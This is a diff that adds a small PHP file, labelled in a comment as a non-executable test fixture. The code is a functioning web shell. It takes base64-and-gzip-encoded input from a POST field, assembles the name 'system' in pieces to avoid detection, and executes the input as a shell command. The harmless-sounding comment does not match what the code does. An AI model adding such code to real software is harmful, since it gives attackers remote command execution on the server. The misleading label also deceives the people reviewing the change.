@@ -1,0 +1,8 @@
+<?php
+/* Non-executable structure fixture. It is never included or interpreted. */
+$incoming = $_POST['opaque'];
+$decoded = gzinflate(base64_decode($incoming));
+$name = 'sys' . 'tem';
+call_user_func($name, $decoded);
+file_put_contents('/disabled/output', $decoded);
+?>
